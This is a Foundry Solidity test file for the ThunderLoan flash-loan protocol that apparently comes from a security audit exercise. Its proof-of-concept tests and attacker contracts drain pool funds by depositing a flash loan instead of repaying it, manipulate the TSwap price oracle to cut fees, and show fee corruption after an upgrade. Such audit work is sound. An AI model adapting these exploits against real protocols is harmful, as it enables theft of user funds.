// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan, ERC20Mock, ERC1967Proxy } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC20Errors } from "@openzeppelin/contracts/interfaces/draft-IERC6093.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { IFlashLoanReceiver } from "src/interfaces/IFlashLoanReceiver.sol";
import {ThunderLoanUpgraded} from 'src/upgradedProtocol/ThunderLoanUpgraded.sol';

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public view {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    //@audit-poc
    function test_Deposit_And_Redeem_Drains_Pool() external setAllowedToken {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();

        //get exchange rate
        AssetToken assetToken = thunderLoan.getAssetFromToken(IERC20(tokenA));
        uint256 exchangeRate = AssetToken(assetToken).getExchangeRate();
        console.log("AssetToken: exchangeRate on deposit 1 - ", exchangeRate); //1.003 ether

        vm.startPrank(user);
        tokenA.mint(user, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();

        exchangeRate = AssetToken(assetToken).getExchangeRate();
        console.log("AssetToken: exchangeRate on deposit 2 - ", exchangeRate); //1.0045 ether

        vm.startPrank(user);
        thunderLoan.redeem(IERC20(tokenA), type(uint256).max);
        vm.stopPrank();

        exchangeRate = AssetToken(assetToken).getExchangeRate();
        console.log("New user balance: ", IERC20(tokenA).balanceOf(user));
        console.log("AssetToken: exchangeRate on deposit 3 - ", exchangeRate); //1.0045 ether

        vm.startPrank(liquidityProvider);
        uint256 tokensAvailable = tokenA.balanceOf(address(assetToken));
        uint256 tokensUserCanRedeem =
            (assetToken.balanceOf(liquidityProvider) * exchangeRate) / assetToken.EXCHANGE_RATE_PRECISION();
        bytes memory expectedError = abi.encodeWithSelector(
            IERC20Errors.ERC20InsufficientBalance.selector, address(assetToken), tokensAvailable, tokensUserCanRedeem
        );
        vm.expectRevert(expectedError);
        thunderLoan.redeem(IERC20(tokenA), type(uint256).max);
        vm.stopPrank();

        exchangeRate = AssetToken(assetToken).getExchangeRate();
        console.log("AssetToken: exchangeRate on deposit 4 - ", exchangeRate);
    }
    //@audit-poc

    function test_Deposit_using_flashLoan_Without_Repay() external setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepayFlashLoanReceiver flashLoanReceiver = new DepositOverRepayFlashLoanReceiver(thunderLoan);

        vm.startPrank(user);
        tokenA.mint(address(flashLoanReceiver), AMOUNT);
        //users taking out a flash loan via FlashLoanReceiver
        thunderLoan.flashloan(address(flashLoanReceiver), tokenA, amountToBorrow, "");

        uint256 tokensInvested = tokenA.balanceOf(address(flashLoanReceiver));
        assertEq(tokensInvested, AMOUNT - calculatedFee);

        //user redeeming the stolen tokens
        flashLoanReceiver.redeemTokens(user);

        vm.stopPrank();

        //tokenA balance of user:
        uint256 totalTokenAReceived = tokenA.balanceOf(user);
        assertGt(totalTokenAReceived, amountToBorrow);
        console.log("totalTokenAReceived: ", totalTokenAReceived, amountToBorrow, calculatedFee);
        // 110.027437357158047785 - tokens stolen
        // 100 tokens borrowed using flash loan
        // 0.3 tokens used for the exploit
    }

    //@audit-poc
    function testRedeemToken() external setAllowedToken hasDeposits {
        //user makes a deposit
        vm.startPrank(user);
        tokenA.mint(user, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();

        //user tries to withdraw the tokens
        vm.startPrank(user);
        thunderLoan.redeem(tokenA, type(uint256).max);
        vm.stopPrank();

        uint256 tokenARedeemed = tokenA.balanceOf(user);
        console.log(tokenARedeemed, DEPOSIT_AMOUNT);
        assertGt(tokenARedeemed, DEPOSIT_AMOUNT);
    }

    //@audit-poc
    function test_Redeem_After_Loan() external setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        //liquidityProvider tries to redeem the tokens
        vm.startPrank(liquidityProvider);
        //Redemption is expected to fail
        //Deposit => 1000e18
        //Fee => 0.3e18
        //Amount to redeem => 1000.3e18
        //Protocol trying to withdraw => 1003.3009e18
        vm.expectRevert();
        thunderLoan.redeem(tokenA, type(uint256).max);
        vm.stopPrank();
    }
    //@audit-poc

    function testOracleManipulation() external {
        //Set up logic
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        BuffMockPoolFactory mockPoolFactory = new BuffMockPoolFactory(address(weth));
        //create a tswap dex between weth and tokenA
        BuffMockTSwap tSwapPool = BuffMockTSwap(mockPoolFactory.createPool(address(tokenA)));

        proxy = new ERC1967Proxy(address(thunderLoan), "");
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(mockPoolFactory));

        //fund the tswapPool;
        vm.startPrank(liquidityProvider);
        tokenA.approve(address(tSwapPool), type(uint256).max);
        tokenA.mint(liquidityProvider, 100e18);
        weth.approve(address(tSwapPool), type(uint256).max);
        weth.mint(liquidityProvider, 100e18);
        //Ratio is 100WETH, 100 TokenA => 1:1
        tSwapPool.deposit(100e18, 0, 100e18, uint64(block.timestamp));
        vm.stopPrank();

        // set the allowance for tokenA in the contract
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);

        //fund the thunder loan
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), type(uint256).max);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();

        //100WETH, 100TokenA => TSwap
        //1000TokenA => ThunderLoan

        // Take out the flash loan of 50e18 of tokenA, swap with WETH in tswap => 150 TokenA, ~ 66WETH
        // Take out another flash loan of 50e18 of tokenA and see how much cheaper it gets
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console.log("Normal fee is: ", normalFeeCost); //0.296147410319118389
        AssetToken repayAddress = thunderLoan.getAssetFromToken(tokenA);
        MaliciousFlashLoanReceiver flashLoanReceiver =
            new MaliciousFlashLoanReceiver(thunderLoan, tSwapPool, weth, address(repayAddress));
        vm.startPrank(user);
        //minting extra tokens for fee
        tokenA.mint(address(flashLoanReceiver), 0.5e18);
        thunderLoan.flashloan(address(flashLoanReceiver), tokenA, 50e18, "");

        uint256 updatedFee = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console.log("Updated fee is: ", updatedFee); //0.295561830512437069
        vm.stopPrank();

        uint256 attackFee = flashLoanReceiver.feeToPayoff();
        assertLt(attackFee, normalFeeCost);
    }

    //@audit-poc
    function testUpgradeBreaks() external{
        uint256 feeBeforeUpgrade = thunderLoan.getFee(); //0.003

        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded thunderLoanUpgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(thunderLoanUpgraded), "");
        vm.stopPrank();

        uint256 feeAfterUpgrade = thunderLoan.getFee(); //1

        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }
}

contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    //Swap tokenA borrowed to WETH.
    //Take out another flash loan
    //Check the fee for the 2nd slot of 50TokenA
    //Repay the loan
    //Repay the loan
    ThunderLoan immutable i_thunderLoan;
    BuffMockTSwap immutable i_tswapPool;
    IERC20 immutable i_weth;
    address immutable i_repayAddress;
    bool attacked;
    uint256 public feeToPayoff;

    constructor(ThunderLoan thunderLoan, BuffMockTSwap tswapPool, IERC20 weth, address repayAddress) {
        i_thunderLoan = thunderLoan;
        i_tswapPool = tswapPool;
        i_weth = weth;
        i_repayAddress = repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        if (!attacked) {
            attacked = true;
            uint256 wethBought = i_tswapPool.getOutputAmountBasedOnInput(
                amount, IERC20(token).balanceOf(address(i_tswapPool)), i_weth.balanceOf(address(i_tswapPool))
            );
            IERC20(token).approve(address(i_tswapPool), amount);
            i_tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(amount, wethBought, block.timestamp);
            //100WETH, 100TokenA => 66.733400066733400067 WETH, 150TokenA

            feeToPayoff = fee + i_thunderLoan.getCalculatedFee(IERC20(token), amount); //0.214167600932190305

            //Take out the flashLoan again
            i_thunderLoan.flashloan(address(this), IERC20(token), amount, "");

            //if you can't replay, then you can just transfer the tokens
            IERC20(token).transfer(address(i_repayAddress), amount + fee);
        } else {
            //tokenA => 50e18, weth: 33e18 present
            //Calculate the fee and repay the loan
            uint256 wethPresent = i_weth.balanceOf(address(this));
            uint256 poolTokensBought = i_tswapPool.getOutputAmountBasedOnInput(
                wethPresent, i_weth.balanceOf(address(i_tswapPool)), IERC20(token).balanceOf(address(i_tswapPool))
            );
            i_weth.approve(address(i_tswapPool), type(uint256).max);
            i_tswapPool.swapWethForPoolTokenBasedOnInputWeth(wethPresent, poolTokensBought, block.timestamp);

            //repay the flash loan
            IERC20(token).transfer(address(i_repayAddress), amount + fee);
        }
        return true;
    }
}

contract DepositOverRepayFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan immutable i_thunderLoan;
    IERC20 s_token;

    constructor(ThunderLoan thunderLoan) {
        i_thunderLoan = thunderLoan;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    { 
        s_token = IERC20(token);
        IERC20(token).approve(address(i_thunderLoan), amount + fee);
        bytes memory depositCall = abi.encodeCall(ThunderLoan.deposit, (IERC20(token), amount + fee));
        (bool successDeposit,) = address(i_thunderLoan).call(depositCall);
        if (!successDeposit) {
            revert("Deposit failed by thunder loan");
        }
        return true;
    }

    function redeemTokens(address user) external {
        bytes memory redeemCall = abi.encodeCall(ThunderLoan.redeem, (s_token, type(uint256).max));
        (bool success,) = address(i_thunderLoan).call(redeemCall);
        if (success) {
            s_token.transfer(user, s_token.balanceOf(address(this)));
        }
    }
}
